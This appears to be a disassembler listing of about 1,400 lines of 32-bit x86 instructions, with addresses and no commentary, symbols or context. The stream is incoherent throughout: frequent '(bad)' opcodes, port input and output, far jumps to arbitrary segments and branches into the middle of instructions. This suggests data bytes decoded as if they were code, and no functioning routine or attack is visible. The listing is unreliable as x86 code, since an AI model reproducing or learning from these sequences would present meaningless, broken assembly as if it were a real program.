  40d5aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5ab:	jbe    0x40d626
  40d5ad:	cmp    eax,edi
  40d5af:	xor    BYTE PTR [ebx],ah
  40d5b1:	push   ds
  40d5b2:	sub    esi,DWORD PTR [eax*1+0x29f357db]
  40d5b9:	jge    0x40d572
  40d5bb:	xchg   edx,eax
  40d5bc:	push   esp
  40d5bd:	mov    ch,0xe7
  40d5bf:	mov    cl,0x77
  40d5c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5c2:	add    al,0xcb
  40d5c4:	cs ins BYTE PTR es:[edi],dx
  40d5c6:	fadd   DWORD PTR [ecx+0x77]
  40d5c9:	sahf   
  40d5ca:	dec    ebp
  40d5cb:	leave  
  40d5cc:	popa   
  40d5cd:	pop    eax
  40d5ce:	cmp    al,0x76
  40d5d0:	push   esp
  40d5d1:	dec    edx
  40d5d2:	in     al,dx
  40d5d3:	and    ebx,ebp
  40d5d5:	icebp  
  40d5d6:	ds mov ebx,0x6b2237de
  40d5dc:	nop
  40d5dd:	scas   eax,DWORD PTR es:[edi]
  40d5de:	das    
  40d5df:	mov    ebx,0x7222e529
  40d5e4:	push   esi
  40d5e5:	pop    esp
  40d5e6:	addr16 jae 0x40d5c6
  40d5e9:	inc    edx
  40d5ea:	push   ebx
  40d5eb:	cdq    
  40d5ec:	mov    ecx,0x5fe3e162
  40d5f1:	or     al,0x68
  40d5f3:	push   ecx
  40d5f4:	cmp    ch,bh
  40d5f6:	repnz mov edx,0x2e178a8c
  40d5fc:	or     BYTE PTR [edi+0x7d],0x8a
  40d600:	xor    DWORD PTR [ecx+0xf],ebp
  40d603:	or     DWORD PTR [edi+edi*1-0x2],ebx
  40d607:	push   0xfffffff9
  40d609:	xor    DWORD PTR ds:[ebp-0x276218da],ebx
  40d610:	mov    ah,0x2b
  40d612:	daa    
  40d613:	jg     0x40d61f
  40d615:	cmp    ebx,ebx
  40d617:	sub    BYTE PTR [edi-0x4424a81],0xd3
  40d61e:	les    esi,FWORD PTR [ecx]
  40d620:	pushf  
  40d621:	in     al,dx
  40d622:	(bad)  
  40d623:	in     al,dx
  40d624:	or     bl,BYTE PTR [ebp+eax*2-0x2c]
  40d628:	loop   0x40d656
  40d62a:	push   edx
  40d62b:	out    0x48,eax
  40d62d:	and    BYTE PTR [ebp+0x4f],dh
  40d630:	jno    0x40d69a
  40d632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d633:	sahf   
  40d634:	in     eax,dx
  40d635:	and    al,al
  40d637:	in     al,0x7b
  40d639:	fdivr  QWORD PTR [ecx-0x1a]
  40d63c:	les    eax,FWORD PTR [esi+edi*8+0x21]
  40d640:	js     0x40d5f2
  40d642:	jb     0x40d65f
  40d644:	add    BYTE PTR fs:[esi+0x17],dh
  40d648:	pop    ebx
  40d649:	push   edi
  40d64a:	dec    ebx
  40d64b:	aas    
  40d64c:	das    
  40d64d:	adc    ax,0x2677
  40d651:	daa    
  40d652:	neg    BYTE PTR [ecx+0x7f1233]
  40d658:	and    ebx,DWORD PTR [esi]
  40d65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d65b:	sub    esp,ecx
  40d65d:	imul   esp,ebp,0xffffff93
  40d660:	xor    dh,BYTE PTR [ebp+0x1265ad70]
  40d666:	add    BYTE PTR [edx-0x35],ch
  40d669:	add    BYTE PTR [ecx-0x5f],bh
  40d66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d66d:	(bad)  
  40d66e:	repnz out dx,al
  40d670:	jle    0x40d5f3
  40d672:	xchg   ebp,eax
  40d673:	cmc    
  40d674:	fwait
  40d675:	mov    al,0x90
  40d677:	sbb    bl,BYTE PTR [esi-0x31df1fdc]
  40d67d:	cmp    esp,edx
  40d67f:	pop    edx
  40d680:	inc    eax
  40d681:	fwait
  40d682:	inc    esi
  40d683:	push   edi
  40d684:	or     ecx,DWORD PTR [ecx]
  40d686:	or     eax,0x52940129
  40d68b:	adc    esi,DWORD PTR [edx]
  40d68d:	fwait
  40d68e:	xor    esi,DWORD PTR [eax+0x24]
  40d691:	xor    dl,0xab
  40d694:	mov    DWORD PTR [edi+eiz*8],edx
  40d697:	xlat   BYTE PTR cs:[ebx]
  40d699:	cmp    eax,0x95630f1b
  40d69e:	jge    0x40d6c0
  40d6a0:	add    al,0xd6
  40d6a2:	mov    WORD PTR [ebp+0x38],ss
  40d6a5:	dec    DWORD PTR [eax-0x4f09c702]
  40d6ab:	mov    ds:0x1d4a6c9,eax
  40d6b0:	sub    ebx,DWORD PTR [esi-0x6f49c47f]
  40d6b6:	pop    edi
  40d6b7:	mov    al,0x4e
  40d6b9:	call   0x50a0:0xbaf19d0b
  40d6c0:	jp     0x40d66f
  40d6c2:	sbb    al,0xd0
  40d6c4:	xor    al,0x80
  40d6c6:	dec    esp
  40d6c7:	inc    ebp
  40d6c8:	(bad)  
  40d6c9:	out    dx,al
  40d6ca:	and    BYTE PTR [edi],dl
  40d6cc:	out    0xa4,al
  40d6ce:	fs test al,0xb8
  40d6d1:	cdq    
  40d6d2:	push   0xffffffe6
  40d6d4:	mov    BYTE PTR [ebp-0x325421fc],al
  40d6da:	sub    BYTE PTR [eax+0x67],dl
  40d6dd:	aam    0x9
  40d6df:	push   edx
  40d6e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6e1:	xchg   ebp,eax
  40d6e2:	cli    
  40d6e3:	daa    
  40d6e4:	adc    cl,BYTE PTR [esi-0x5bbc2637]
  40d6ea:	mov    edx,0xca9ffa53
  40d6ef:	mov    DWORD PTR [esp+ecx*2+0xb7ad809],ebx
  40d6f6:	dec    eax
  40d6f7:	(bad)  
  40d6fa:	cdq    
  40d6fb:	push   cs
  40d6fc:	test   DWORD PTR [ebp-0x3ee89207],ebx
  40d702:	push   edx
  40d703:	pusha  
  40d704:	enter  0x365e,0x3b
  40d708:	dec    esi
  40d709:	ficomp DWORD PTR [ecx+0x4b]
  40d70c:	outs   dx,DWORD PTR ds:[esi]
  40d70d:	fisub  DWORD PTR [edx]
  40d70f:	push   0x5e
  40d711:	repnz jecxz 0x40d767
  40d714:	mov    al,0xba
  40d716:	test   DWORD PTR [edi+0x626861f],esp
  40d71c:	xchg   ecx,eax
  40d71d:	inc    esi
  40d71e:	xchg   ebp,eax
  40d71f:	xor    al,0x59
  40d721:	adc    esp,DWORD PTR [edi-0x5b9681ae]
  40d727:	mov    ah,0x9c
  40d729:	push   ecx
  40d72a:	ss mov bh,0x35
  40d72d:	add    BYTE PTR [esi],ah
  40d72f:	in     eax,dx
  40d730:	lods   eax,DWORD PTR ds:[esi]
  40d731:	sbb    DWORD PTR [esi-0x29cfa340],0x9083010
  40d73b:	xchg   esi,eax
  40d73c:	xor    eax,edx
  40d73e:	(bad)  
  40d73f:	sbb    ch,cl
  40d741:	inc    edi
  40d742:	mov    bh,BYTE PTR [edi+0x6b177410]
  40d748:	mov    ecx,0x21f7e009
  40d74d:	mov    ecx,0xedd2e954
  40d752:	sub    BYTE PTR [esi-0x477c3f52],ah
  40d758:	cmp    BYTE PTR [ecx],al
  40d75a:	inc    ebp
  40d75b:	ret    
  40d75c:	dec    esp
  40d75d:	jne    0x40d7d8
  40d75f:	pop    ds
  40d760:	cmp    al,0x80
  40d762:	repnz dec eax
  40d764:	hlt    
  40d765:	test   DWORD PTR [esi+0x8],esp
  40d768:	xchg   esp,eax
  40d769:	sub    al,0xe9
  40d76b:	dec    ebp
  40d76c:	push   0x73f4ef11
  40d771:	add    eax,0xc97f4189
  40d776:	aas    
  40d777:	xchg   ecx,eax
  40d778:	mov    ds:0xe68fd078,eax
  40d77d:	leave  
  40d77e:	mov    WORD PTR ss:[eax-0x3299c688],gs
  40d785:	add    bh,BYTE PTR ds:0xc1c6d7f1
  40d78b:	fsub   QWORD PTR ds:0x57b1df1
  40d791:	(bad)  
  40d792:	xchg   ecx,eax
  40d793:	mov    ebx,0xb834904a
  40d798:	shl    BYTE PTR ss:[ebx-0x6794c491],1
  40d79f:	push   cs
  40d7a0:	pop    esp
  40d7a1:	test   al,0x8a
  40d7a3:	mov    esp,0x4d96bb47
  40d7a8:	inc    ebx
  40d7a9:	mov    esi,0x34c3ce36
  40d7ae:	rcr    dl,1
  40d7b0:	add    ebx,edi
  40d7b2:	inc    esi
  40d7b3:	inc    ebp
  40d7b4:	fwait
  40d7b5:	cld    
  40d7b6:	sbb    DWORD PTR [edi-0x7334cb44],esi
  40d7bc:	pop    ebp
  40d7bd:	sbb    eax,0xfb261a04
  40d7c2:	sbb    ch,bl
  40d7c4:	jns    0x40d83c
  40d7c6:	jmp    0x40d776
  40d7c8:	fwait
  40d7c9:	mov    ds:0xf109e8be,eax
  40d7ce:	repz loopne 0x40d7a3
  40d7d1:	xchg   esi,eax
  40d7d2:	aad    0x23
  40d7d4:	jle    0x40d7d8
  40d7d6:	mov    WORD PTR [edx+edi*4+0x4a7a9acf],cs
  40d7dd:	fcom   st(1)
  40d7df:	data16 add al,0xcb
  40d7e2:	and    DWORD PTR [eax],eax
  40d7e4:	dec    edi
  40d7e5:	adc    edi,DWORD PTR [ecx-0x1066fb68]
  40d7eb:	lock mov dl,0x6d
  40d7ee:	push   es
  40d7ef:	into   
  40d7f0:	out    0x8,eax
  40d7f2:	ds stos DWORD PTR es:[edi],eax
  40d7f4:	rcl    BYTE PTR [eax-0x3fa865bd],1
  40d7fa:	pop    esi
  40d7fb:	clc    
  40d7fc:	adc    eax,0xee71f6c
  40d801:	lock ret 0x6c1c
  40d805:	jmp    0xf894:0xfcb71257
  40d80c:	cld    
  40d80d:	or     DWORD PTR [edx+esi*1-0x5],0x4e
  40d812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d813:	xor    ebx,esp
  40d815:	jne    0x40d7a1
  40d817:	jnp    0x40d7e4
  40d819:	fstp   DWORD PTR [esi]
  40d81b:	mov    ch,0x8d
  40d81d:	test   al,0xce
  40d81f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d820:	jge    0x40d894
  40d822:	lock add dh,al
  40d825:	daa    
  40d826:	cdq    
  40d827:	or     edi,edi
  40d829:	test   BYTE PTR [esi+edi*8],0xc5
  40d82d:	hlt    
  40d82e:	shr    DWORD PTR [eax+edi*2-0x17],cl
  40d832:	cdq    
  40d833:	je     0x40d87f
  40d835:	xlat   BYTE PTR ds:[ebx]
  40d836:	sbb    BYTE PTR [eax+eiz*2+0x54],al
  40d83a:	push   edi
  40d83b:	out    0xc5,al
  40d83d:	inc    ebp
  40d83e:	adc    eax,edx
  40d840:	test   eax,0x474dbe30
  40d845:	loope  0x40d841
  40d847:	ds in  al,dx
  40d849:	lahf   
  40d84a:	push   ebx
  40d84b:	jge    0x40d82c
  40d84d:	in     eax,0x15
  40d84f:	adc    al,0xc0
  40d851:	je     0x40d802
  40d853:	inc    esi
  40d854:	cmp    BYTE PTR [edx-0x4a],bh
  40d857:	mov    al,ds:0x6d5d5c0f
  40d85c:	lahf   
  40d85d:	mov    cl,0xa6
  40d85f:	xchg   esi,eax
  40d860:	repnz scas al,BYTE PTR es:[edi]
  40d862:	jge    0x40d8c7
  40d864:	hlt    
  40d865:	outs   dx,DWORD PTR ds:[esi]
  40d866:	aad    0x5b
  40d868:	repnz push esi
  40d86a:	jmp    0x5589d894
  40d86f:	aam    0xeb
  40d871:	scas   eax,DWORD PTR es:[edi]
  40d872:	pop    es
  40d873:	ds xchg edi,eax
  40d875:	out    dx,eax
  40d876:	idiv   edx
  40d878:	pop    ebp
  40d879:	sub    al,0xfa
  40d87b:	jnp    0x40d855
  40d87d:	cmp    ah,BYTE PTR [bp+0x7284]
  40d882:	clc    
  40d883:	aaa    
  40d884:	mul    esp
  40d886:	sbb    eax,0xc275032f
  40d88b:	loop   0x40d866
  40d88d:	push   ebp
  40d88e:	push   edi
  40d88f:	(bad)  
  40d890:	pop    ebp
  40d891:	mov    ebp,0x90ef9f30
  40d896:	jecxz  0x40d8df
  40d898:	inc    ebp
  40d899:	repz repnz sahf 
  40d89c:	lds    edx,FWORD PTR [edi+edi*1+0x4d6c9173]
  40d8a3:	in     al,0xca
  40d8a5:	aaa    
  40d8a6:	into   
  40d8a7:	sbb    DWORD PTR [ebx+eiz*4+0x4a5317ec],eax
  40d8ae:	fwait
  40d8af:	inc    esi
  40d8b0:	in     al,dx
  40d8b1:	push   ss
  40d8b2:	add    dl,BYTE PTR [eax-0x16]
  40d8b5:	and    esp,DWORD PTR [ecx+0x55]
  40d8b8:	int    0x48
  40d8ba:	adc    DWORD PTR [edx],esp
  40d8bc:	or     DWORD PTR ds:0xaf65aad5,ecx
  40d8c2:	dec    edx
  40d8c3:	jp     0x40d881
  40d8c5:	ins    BYTE PTR es:[edi],dx
  40d8c6:	sub    DWORD PTR [ecx+0x3b62c817],ebx
  40d8cc:	cmp    DWORD PTR [esi],0xfffffff5
  40d8cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8d0:	jmp    0x40d936
  40d8d2:	mov    eax,ds:0x3aae6d5
  40d8d7:	pop    ds
  40d8d8:	mov    dh,0xf8
  40d8da:	ret    0xe806
  40d8dd:	mov    ebx,DWORD PTR [ebp+0x77]
  40d8e0:	in     al,dx
  40d8e1:	add    ax,0xfd8c
  40d8e5:	and    DWORD PTR [edi+0x79],edi
  40d8e8:	adc    al,0x8c
  40d8ea:	adc    eax,0x1627ca6e
  40d8ef:	sbb    ah,bh
  40d8f1:	stc    
  40d8f2:	pop    ds
  40d8f3:	sbb    ecx,DWORD PTR [esi+0x41]
  40d8f6:	cld    
  40d8f7:	es inc esp
  40d8f9:	adc    al,dl
  40d8fb:	(bad)  
  40d8fd:	sub    eax,0xe86b0109
  40d902:	cmp    al,0xb3
  40d904:	hlt    
  40d905:	out    0xa3,al
  40d907:	enter  0xcb7b,0xb7
  40d90b:	push   ebx
  40d90c:	pop    edx
  40d90d:	(bad)  
  40d90e:	fadd   QWORD PTR [edx]
  40d910:	push   esi
  40d911:	xor    ebp,DWORD PTR [ebx+0x15]
  40d914:	or     al,0xea
  40d916:	ins    DWORD PTR es:[edi],dx
  40d917:	test   eax,0xe9f0a208
  40d91c:	jmp    0x6b93:0xa76ef9bb
  40d923:	xor    eax,0xc2aaa290
  40d928:	fs ja  0x40d946
  40d92b:	out    dx,al
  40d92c:	adc    eax,edx
  40d92e:	push   eax
  40d92f:	jns    0x40d953
  40d931:	cmp    cl,BYTE PTR [edx-0xe5a95a3]
  40d937:	loop   0x40d971
  40d939:	ins    BYTE PTR es:[edi],dx
  40d93a:	push   ds
  40d93b:	jmp    0x40d967
  40d93d:	jecxz  0x40d8df
  40d93f:	jo     0x40d997
  40d941:	fiadd  WORD PTR [esi-0x7b8d5126]
  40d947:	sub    BYTE PTR [eax-0x73],dh
  40d94a:	mov    bh,0x7a
  40d94d:	cmp    al,0x87
  40d94f:	arpl   WORD PTR [ebx+0x533061c6],si
  40d955:	push   ecx
  40d956:	call   0xec2be3dc
  40d95b:	sbb    eax,0x51966aa9
  40d960:	test   al,0xf1
  40d962:	retf   0xf0ce
  40d965:	js     0x40d960
  40d967:	out    dx,eax
  40d968:	fadd   DWORD PTR [eax-0x27ebf0ef]
  40d96e:	xor    al,0x18
  40d970:	in     eax,dx
  40d971:	mov    cl,0xe2
  40d973:	mov    dl,0x87
  40d975:	into   
  40d976:	aas    
  40d977:	pusha  
  40d978:	enter  0x417,0x69
  40d97c:	leave  
  40d97d:	loopne 0x40d9a5
  40d97f:	pop    eax
  40d980:	mov    ebp,0x4e959364
  40d985:	fisub  WORD PTR [ecx+0x27]
  40d988:	sahf   
  40d989:	sahf   
  40d98a:	xor    edx,ebx
  40d98c:	iret   
  40d98d:	test   eax,0x1ab872b6
  40d992:	add    bh,BYTE PTR ds:0x5b12e595
  40d998:	xchg   ecx,eax
  40d999:	push   ss
  40d99a:	pop    esi
  40d99b:	mov    edi,0x960d21d1
  40d9a0:	jbe    0x40d97e
  40d9a2:	dec    ebx
  40d9a3:	arpl   WORD PTR [esi-0x67c0d015],bp
  40d9a9:	push   edx
  40d9aa:	test   eax,0x21f091bf
  40d9af:	jecxz  0x40d9c8
  40d9b1:	xchg   ecx,eax
  40d9b2:	js     0x40d968
  40d9b4:	mov    cl,0xa5
  40d9b6:	push   ss
  40d9b7:	nop
  40d9b8:	in     eax,0x5b
  40d9ba:	and    esp,DWORD PTR [esi+edx*1+0x6cc1c155]
  40d9c1:	jno    0x40d9a5
  40d9c3:	push   esp
  40d9c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9c6:	pop    esi
  40d9c7:	iret   
  40d9c8:	dec    edx
  40d9c9:	(bad)  
  40d9ca:	jns    0x40d96c
  40d9cc:	pop    edx
  40d9cd:	fucomp st(4)
  40d9cf:	sbb    BYTE PTR [ebp-0x5a],cl
  40d9d2:	out    0x8b,al
  40d9d4:	adc    edx,DWORD PTR [esi]
  40d9d6:	gs mov al,0xc
  40d9d9:	std    
  40d9da:	cmp    ecx,eax
  40d9dc:	js     0x40d9ae
  40d9de:	cs inc eax
  40d9e0:	retw   
  40d9e2:	fsub   QWORD PTR [ecx+0x1e]
  40d9e5:	ja     0x40d9f8
  40d9e7:	cmp    ebx,edx
  40d9e9:	into   
  40d9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9eb:	mov    bh,0xff
  40d9ed:	add    edi,eax
  40d9ef:	mov    ch,0x24
  40d9f1:	repz addr16 hlt 
  40d9f4:	push   cs
  40d9f5:	test   eax,0xbcf07265
  40d9fa:	mov    esp,0x15d6a563
  40d9ff:	and    al,0x9e
  40da01:	pop    edx
  40da02:	xchg   DWORD PTR [ebx+0x13],esp
  40da05:	mov    ds:0x690da992,al
  40da0a:	cmp    ch,BYTE PTR [esi+0x6f]
  40da0d:	push   ecx
  40da0e:	and    DWORD PTR [esp+eax*4+0x8],esp
  40da12:	add    DWORD PTR [esi+0x5a6480a6],ebx
  40da18:	rcr    DWORD PTR [edx+edx*8],1
  40da1b:	out    0x60,eax
  40da1d:	push   eax
  40da1e:	xchg   esi,ebp
  40da20:	fild   WORD PTR [eax+0x2586ddb8]
  40da26:	imul   edi,DWORD PTR [edi],0xd59d0e2a
  40da2c:	jecxz  0x40d9c9
  40da2e:	pop    ds
  40da2f:	push   ss
  40da30:	cdq    
  40da31:	sbb    DWORD PTR [ebx+0x46],edi
  40da34:	int3   
  40da35:	dec    ebp
  40da36:	aas    
  40da37:	xchg   ebx,eax
  40da38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da39:	push   edi
  40da3a:	or     DWORD PTR [ebp+0xc],esi
  40da3d:	and    al,0x59
  40da3f:	add    dl,BYTE PTR [eax+0x9bfad8e]
  40da45:	add    DWORD PTR [edi+eax*4-0x2d],ebp
  40da49:	in     al,dx
  40da4a:	(bad)  
  40da4b:	or     ebx,DWORD PTR [ebp-0x1d30e2a3]
  40da51:	pop    ebp
  40da52:	in     eax,0x56
  40da54:	call   0x6a46:0x65fcff13
  40da5b:	sub    eax,0x3932f9e0
  40da60:	rcl    bh,cl
  40da62:	mov    ah,0x3f
  40da64:	add    edi,DWORD PTR [edi-0x6e]
  40da67:	in     eax,dx
  40da68:	pushf  
  40da69:	scas   al,BYTE PTR es:[edi]
  40da6a:	shl    DWORD PTR [ebx],cl
  40da6c:	mov    esi,0xa1f5fc38
  40da71:	dec    esp
  40da72:	and    bl,bh
  40da74:	inc    esp
  40da75:	mov    eax,ds:0xb64d9596
  40da7a:	xchg   ecx,eax
  40da7b:	or     edi,DWORD PTR [ebx+0x482d595d]
  40da81:	retf   0xeec5
  40da84:	jl     0x40dad4
  40da86:	js     0x40dac3
  40da88:	je     0x40dad7
  40da8a:	push   edx
  40da8b:	fidiv  WORD PTR [edi]
  40da8d:	stc    
  40da8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da8f:	lahf   
  40da90:	add    eax,0x202652a
  40da95:	sahf   
  40da96:	xor    bh,BYTE PTR ds:0xdd8fe601
  40da9c:	ja     0x40dad7
  40da9e:	adc    al,BYTE PTR [edx]
  40daa0:	mov    bl,0xce
  40daa2:	fwait
  40daa3:	and    edi,eax
  40daa5:	mov    bh,0xc5
  40daa7:	xor    bh,BYTE PTR [ecx+0x12]
  40daaa:	dec    ecx
  40daab:	cwde   
  40daac:	(bad)  
  40daad:	or     ah,cl
  40daaf:	loope  0x40da3d
  40dab1:	push   esi
  40dab2:	sbb    cl,BYTE PTR [ebp+edx*1+0x21]
  40dab6:	stc    
  40dab7:	scas   al,BYTE PTR es:[edi]
  40dab8:	mov    bl,0x31
  40daba:	xor    edx,DWORD PTR [esi+edi*4+0xb]
  40dabe:	lds    edx,FWORD PTR [ebp-0x67924c72]
  40dac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dac5:	test   BYTE PTR [ebx-0x7bbab64d],al
  40dacb:	sub    BYTE PTR [eax-0x4a],dh
  40dace:	imul   ecx,ecx,0x74f2a781
  40dad4:	aas    
  40dad5:	push   eax
  40dad6:	std    
  40dad7:	imul   DWORD PTR [ebp-0xd8731f3]
  40dadd:	pop    eax
  40dade:	and    DWORD PTR [edi],edi
  40dae0:	out    0x56,al
  40dae2:	bound  esi,QWORD PTR [edx+ebp*1+0x3e]
  40dae6:	jno    0x40db42
  40dae8:	mov    dh,0xbf
  40daea:	stos   BYTE PTR es:[edi],al
  40daeb:	sbb    DWORD PTR [ebx-0x8dfdd05],esi
  40daf1:	data16 aad 0x2f
  40daf4:	pop    ss
  40daf5:	not    BYTE PTR [edi]
  40daf7:	test   eax,0xb020e5f6
  40dafc:	lock lea ecx,es:[ecx]
  40db00:	int    0x4
  40db02:	lahf   
  40db03:	icebp  
  40db04:	push   ebx
  40db05:	sbb    eax,0xd6486a19
  40db0a:	mov    ds:0xd9d79e13,eax
  40db0f:	retf   0x8cf0
  40db12:	out    0xec,al
  40db14:	jl     0x40daf8
  40db16:	(bad)  
  40db18:	popa   
  40db19:	popa   
  40db1a:	cmp    DWORD PTR [ebx],ecx
  40db1c:	sti    
  40db1d:	(bad)  
  40db20:	or     esi,DWORD PTR [ebp*4-0x15320902]
  40db27:	aad    0x50
  40db29:	sbb    bh,BYTE PTR [edx+ecx*8-0x53]
  40db2d:	xor    esi,DWORD PTR [edi-0x16b0f711]
  40db33:	cmp    dl,BYTE PTR [edx+0x31]
  40db36:	xchg   ebp,eax
  40db37:	in     eax,0xed
  40db39:	test   al,0xcf
  40db3b:	inc    DWORD PTR gs:[eax]
  40db3e:	jmp    0x3be203a3
  40db43:	outs   dx,BYTE PTR ds:[esi]
  40db44:	rol    BYTE PTR [ebp-0x7c],0x18
  40db48:	ins    DWORD PTR es:[edi],dx
  40db49:	hlt    
  40db4a:	test   ebp,edi
  40db4c:	adc    al,0xd2
  40db4e:	fist   DWORD PTR [edx-0x54a0e204]
  40db54:	outs   dx,BYTE PTR ds:[esi]
  40db55:	aad    0x5f
  40db57:	or     eax,DWORD PTR ds:0x2cf563c9
  40db5d:	gs stos DWORD PTR es:[edi],eax
  40db5f:	jg     0x40dbad
  40db61:	or     BYTE PTR [ebx+0x4c4a4dfd],al
  40db67:	outs   dx,DWORD PTR ds:[esi]
  40db68:	sti    
  40db69:	push   0xffffffd9
  40db6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db6c:	push   cs
  40db6d:	daa    
  40db6e:	ja     0x40db57
  40db70:	dec    eax
  40db71:	icebp  
  40db72:	mov    cl,0x71
  40db74:	repnz mov esi,0xc6b0f95
  40db7a:	(bad)  
  40db7b:	shr    BYTE PTR [ecx-0x3],1
  40db7e:	mul    BYTE PTR [eax+esi*2+0x3224698d]
  40db85:	dec    esp
  40db86:	add    esp,DWORD PTR [ecx-0x27]
  40db89:	aam    0xfe
  40db8b:	xchg   ebx,eax
  40db8c:	xor    DWORD PTR [ebp+0x7c362846],ebx
  40db92:	add    al,0xd1
  40db94:	and    al,0xe9
  40db96:	pop    eax
  40db97:	sub    BYTE PTR [esi],dh
  40db99:	mov    DWORD PTR [ebp-0x47],ebp
  40db9c:	cmp    eax,0x6e6c7594
  40dba1:	add    eax,esp
  40dba3:	add    BYTE PTR [eax+0x60],dl
  40dba6:	adc    edx,edx
  40dba8:	mov    edx,0x40de734c
  40dbad:	outs   dx,BYTE PTR ds:[esi]
  40dbae:	xchg   ecx,eax
  40dbaf:	enter  0xe0d7,0x4e
  40dbb3:	cdq    
  40dbb4:	stc    
  40dbb5:	adc    eax,ebx
  40dbb7:	xchg   edi,eax
  40dbb8:	cmp    esp,DWORD PTR [edi+0x68]
  40dbbb:	fwait
  40dbbc:	jns    0x40dba3
  40dbbe:	inc    ebp
  40dbbf:	mov    edx,0xcae91ba3
  40dbc4:	push   edx
  40dbc5:	lock div BYTE PTR [edx]
  40dbc8:	push   esi
  40dbc9:	sbb    ax,0x3cb4
  40dbcd:	dec    esp
  40dbce:	pop    ebx
  40dbcf:	pusha  
  40dbd0:	cmp    DWORD PTR [ebx],edx
  40dbd2:	repnz inc ecx
  40dbd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbd5:	sar    DWORD PTR [edi],1
  40dbd7:	stos   DWORD PTR es:[edi],eax
  40dbd8:	xor    al,BYTE PTR [ecx]
  40dbda:	add    edx,DWORD PTR [eax+0x36]
  40dbdd:	push   edi
  40dbde:	retf   0xe0b6
  40dbe1:	test   WORD PTR [edi-0x43],ax
  40dbe5:	and    al,BYTE PTR [ebx]
  40dbe7:	cmp    eax,0xb06411be
  40dbec:	jge    0x40dbf3
  40dbee:	sahf   
  40dbef:	push   ds
  40dbf0:	fst    QWORD PTR [ecx]
  40dbf2:	adc    al,0x47
  40dbf4:	ja     0x40dc5d
  40dbf6:	ret    
  40dbf7:	scas   eax,DWORD PTR es:[edi]
  40dbf8:	jge    0x40dc06
  40dbfa:	frndint 
  40dbfc:	call   0x191a:0xfd38af55
  40dc03:	fsub   st,st(3)
  40dc05:	call   DWORD PTR [ecx+ebx*8-0x3e84ebb1]
  40dc0c:	iret   
  40dc0d:	mov    fs,WORD PTR [ecx]
  40dc0f:	mov    edx,0x95f35bf4
  40dc14:	pop    esi
  40dc15:	mov    edi,0xc024d44f
  40dc1a:	in     al,0xb
  40dc1c:	or     DWORD PTR [edi+0x3d2e4bfc],ebx
  40dc22:	mov    esp,0x8822489
  40dc27:	out    0x42,eax
  40dc29:	fwait
  40dc2a:	xchg   ecx,eax
  40dc2b:	rcr    DWORD PTR [ebx-0x5282bcee],1
  40dc31:	sbb    al,0x77
  40dc33:	ret    0xafe2
  40dc36:	dec    eax
  40dc37:	adc    ecx,DWORD PTR [ecx+0x62033ea]
  40dc3d:	cld    
  40dc3e:	fsubp  st(4),st
  40dc40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc41:	lea    eax,[esi+0x65]
  40dc44:	stos   BYTE PTR es:[edi],al
  40dc45:	ret    0x2f
  40dc48:	mov    ebp,DWORD PTR [eiz*8+0x4346f769]
  40dc4f:	mov    ch,0x9f
  40dc51:	dec    ebp
  40dc52:	(bad)  
  40dc53:	adc    al,0x84
  40dc55:	cmc    
  40dc56:	inc    ebx
  40dc57:	aas    
  40dc58:	and    ah,BYTE PTR [edx+esi*1]
  40dc5b:	lods   al,BYTE PTR ds:[esi]
  40dc5c:	sbb    edi,DWORD PTR [esi-0x7]
  40dc5f:	or     BYTE PTR [edi+0x47229fb3],bh
  40dc65:	lahf   
  40dc66:	xor    eax,DWORD PTR [edx-0x4c]
  40dc69:	es fucom st(2)
  40dc6c:	jns    0x40dc70
  40dc6e:	out    dx,eax
  40dc6f:	iret   
  40dc70:	add    eax,0xe368ed08
  40dc75:	mov    bh,BYTE PTR [ecx+0x6f]
  40dc78:	fdiv   st,st(3)
  40dc7a:	cmp    DWORD PTR [edi-0x403a2f7],edx
  40dc80:	sub    BYTE PTR [ebp+0xc2d4291],ch
  40dc86:	out    0xdc,eax
  40dc88:	outs   dx,BYTE PTR ds:[esi]
  40dc89:	fcomp  QWORD PTR [ebp+0x2f0979af]
  40dc8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc90:	sbb    al,0x52
  40dc92:	inc    ecx
  40dc93:	mov    dh,0x58
  40dc95:	dec    ebx
  40dc96:	cmp    edi,esi
  40dc98:	sub    BYTE PTR [eax],bl
  40dc9a:	xor    DWORD PTR [esi+0x7dff8a4d],edx
  40dca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dca1:	or     al,0x39
  40dca3:	jmp    0xa5fa:0x9e68f655
  40dcaa:	iret   
  40dcab:	cmc    
  40dcac:	pop    ss
  40dcad:	sub    bh,bh
  40dcaf:	xchg   ebp,eax
  40dcb0:	or     esp,DWORD PTR [eax]
  40dcb2:	stos   BYTE PTR es:[edi],al
  40dcb3:	je     0x40dd1e
  40dcb5:	inc    ecx
  40dcb6:	mov    esp,0x84649103
  40dcbb:	aam    0x66
  40dcbd:	cmp    BYTE PTR [eax-0x21],0xfb
  40dcc1:	(bad)  
  40dcc2:	jmp    0x6fff:0x6477efc9
  40dcc9:	xor    esi,edi
  40dccb:	sbb    ebp,eax
  40dccd:	jle    0x40dd19
  40dccf:	enter  0x4954,0xd6
  40dcd3:	ins    DWORD PTR es:[edi],dx
  40dcd4:	imul   esi,edi,0xffffffa0
  40dcd7:	mov    al,ds:0x68ec8b9d
  40dcdc:	add    al,0xde
  40dcde:	lods   eax,DWORD PTR ds:[esi]
